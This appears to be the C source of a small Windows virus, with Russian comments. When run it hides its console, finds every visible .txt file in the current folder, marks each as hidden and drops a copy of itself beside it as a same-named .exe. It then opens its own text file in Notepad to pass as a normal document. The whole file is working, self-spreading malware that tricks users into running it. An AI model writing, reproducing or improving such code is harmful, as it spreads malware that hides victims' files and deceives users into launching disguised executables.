#include <fileapi.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <fileapi.h>

const bool debug = false;

int main(int argc, char* argv[])
{
	if (!debug) ShowWindow(GetConsoleWindow(), SW_HIDE);
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;
    char *pch, *pch1;
	char myName[MAX_PATH];
	char mytxt[MAX_PATH];
	char path[MAX_PATH];
	char clearPath[MAX_PATH];
	//выясняем свое имя
	strcpy (myName, argv[0]);
	
	//выясняем имя своего txt
	if (debug) printf("my name: %s", myName);
	
	char *isStr = strtok (myName, ".");
	if (isStr != NULL)
	{
		if (strcpy (mytxt, isStr))
		{
			if (strcat (mytxt, ".txt"))
			{
				if (debug) printf("found my txt: %s\n", mytxt);
			}
			else
			{
				if (debug) printf("strcat error");
				return 5;
			}
		}
		else
		{
			if (debug) printf("strcpy error");
			return 4;
		}
			
	}
	else
	{
		if (debug) printf("strtok error");
		return 3;
	}
	
	if (GetFileAttributes(mytxt) == DWORD(-1))
	{
		char createTxtCommand[MAX_PATH];
		strcpy(createTxtCommand, "type nul >");
		strcat(createTxtCommand, mytxt);
		system (createTxtCommand);
		SetFileAttributes (mytxt, FILE_ATTRIBUTE_HIDDEN);
	}		
	
	if (debug) printf ("Start hacking\n");
	
	// выясняем текущую директорию
	if (GetCurrentDirectory (sizeof (path), path))
    {
        if (debug)  printf ("found path:%s\n", path);
		strcpy (clearPath, path);
        lstrcat (clearPath, "\\");
        lstrcat (path, "\\*.txt");
        if (debug)  printf ("edited path:%s\n", path);
    }
	else
	{
        if (debug)  printf ("error while recieving path %s\n", GetLastError ());
		return 1;
	}
		
	hFind = FindFirstFile(path, &FindFileData);
	
	if (hFind == INVALID_HANDLE_VALUE)
    {
		if (debug)  printf ("Invalid file handle. Error is %u.\n", GetLastError ());
		return 2;
	}
	if (strstr (FindFileData.cFileName, mytxt))
	{
		if (debug) printf ("my txt | ");
	}
	if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)
	{
		if (debug) printf ("found hidden .txt file: %s\n", FindFileData.cFileName);
	}
	else
	{
		char tmpExeName[MAX_PATH];
		if (debug)  printf ("found not hidden .txt file: %s\n", FindFileData.cFileName);
		SetFileAttributes (FindFileData.cFileName, FILE_ATTRIBUTE_HIDDEN);
		isStr = strtok (FindFileData.cFileName, ".");
		strcpy (tmpExeName, isStr);
		strcat (tmpExeName, ".exe");
				
		int res = CopyFile (argv[0], tmpExeName, false);
		if (res == 0)
		{
			if (debug) printf ("error while make copy: %d\n", GetLastError ());
			return 6;
		}
	}
	while (FindNextFile(hFind, &FindFileData) != 0)
	{
		
		if (strstr (FindFileData.cFileName, mytxt))
		{
			if (debug) printf ("my txt | ");
		}
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)
		{
			if (debug) printf ("found hidden .txt file: %s\n", FindFileData.cFileName);
		}
		else
		{
			char tmpExeName[MAX_PATH];
			if (debug) printf ("found not hidden .txt file: %s\n", FindFileData.cFileName);
			SetFileAttributes (FindFileData.cFileName, FILE_ATTRIBUTE_HIDDEN);
			isStr = strtok (FindFileData.cFileName, ".");
			strcpy (tmpExeName, isStr);
			strcat (tmpExeName, ".exe");
					
			int res = CopyFile (argv[0], tmpExeName, false);
			if (res == 0)
			{
				if (debug) printf ("error while make copy: %d\n", GetLastError ());
				return 6;
			}
		}
	}

	FindClose(hFind);
	char command[MAX_PATH] = "notepad ";
	if (debug) printf ("%s\n", mytxt);
	strcat (command, mytxt);
	system (command);
	return 0;
}